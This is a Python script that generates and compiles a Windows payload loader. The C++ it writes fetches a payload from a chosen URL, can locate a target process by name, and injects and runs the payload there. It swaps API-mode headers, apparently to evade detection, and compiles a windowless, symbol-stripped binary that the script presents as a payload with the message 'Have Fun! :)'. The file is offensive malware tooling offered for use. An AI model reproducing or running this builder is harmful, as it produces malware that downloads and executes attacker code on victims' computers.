import os
import time
from cli import *

def build (Enumeration, ProcessName, Loader, Url):
    f = open ("main.cpp", "a")
    f.write(f"""
#include <iostream>
#include <string>
#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include "Libraries/FetchFromURL.h"
""")   
    
    if Enumeration != "null":
        f.write(f"""\n
#include "Libraries/{Enumeration}"
""")
    else:
        pass


    f.write(f"""\n
#include "Libraries/{Loader}"

using namespace std;

int main()
{{
    PBYTE pPayloadAddress;
    DWORD pPayloadSize;
    string Url = "{Url}";
    LPWSTR szProcessName = L"{ProcessName}";
    DWORD dwProcessID;
    HANDLE hProcess;
    PBYTE InjectionAddress;
    HANDLE hThread;
    
    if(!FetchFileFromURLA(Url.c_str(), &pPayloadAddress, &pPayloadSize)){{
        cout << "Failed to fetch payload" << endl;
        return 0;
    }}

    """)

    if Enumeration != "null":
        f.write(f"""\n
    if(!GetRemoteProcess(szProcessName, &dwProcessID, &hProcess)){{
        cout << "Failed to find remote process" << endl;
        return 0;
    }}""" ) 
    else:
        pass

    f.write(f"""\n
    if(!PayloadExecute(hProcess, pPayloadAddress, (SIZE_T)pPayloadSize, &InjectionAddress, &hThread)){{
        cout << "Failed to execute payload" << endl;
        return 0;
    }}

    return 0;
}}
""")

    f.close()
    time.sleep(2)
    os.system(f"C:\\msys64\\mingw64\\bin\\g++ -O2 -w -s -o chungus main.cpp -lwininet -lws2_32 -mwindows")
    #result = subprocess.run(['g++', '-o', 'chungus', 'main.cpp','-lwininet', '-lws2_32', '-mwindows'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    #print(result)

def change_header_file(Enumeration, Loader, ApiMode):
    try:
        with open(f"Libraries/{Enumeration}", "r") as file:
            content = file.read()
        content = content.replace('#include "api.h"', f'#include "{ApiMode}"')
        with open(f"Libraries/{Enumeration}", "w") as file:
            file.write(content)
    except:
        pass

    with open(f"Libraries/{Loader}", "r") as file:
        content = file.read()
    content = content.replace('#include "api.h"', f'#include "{ApiMode}"')
    with open(f"Libraries/{Loader}", "w") as file:
        file.write(content)

def restore_header_file(Enumeration, Loader, ApiMode):
    try:
        with open(f"Libraries/{Enumeration}", "r") as file:
            content = file.read()
        content = content.replace(f'#include "{ApiMode}"', '#include "api.h"')
        with open(f"Libraries/{Enumeration}", "w") as file:
            file.write(content)
    except:
        pass

    with open(f"Libraries/{Loader}", "r") as file:
        content = file.read()
    content = content.replace(f'#include "{ApiMode}"', '#include "api.h"')
    with open(f"Libraries/{Loader}", "w") as file:
        file.write(content)

def main():

    if set_payload_location() == "2":
        Url = set_url()
    else:
        exit()
    
    #TODO  set_payload_encryption()

    if set_loader_type() == "1":
        Loader = set_local_loader_type()
        Enumeration = "null"
        ProcessName = "null"
    else:
        pass
              
    ApiMode = set_api_mode()

    change_header_file(Enumeration, Loader, ApiMode)

    if build(Enumeration, ProcessName, Loader, Url):
        print(f"\nPayload Built Successfully!\nHave Fun! :)")
    else:
        print(f"\nFailed to build payload :(")
    
    restore_header_file(Enumeration, Loader, ApiMode)


if __name__ == "__main__":
    main()
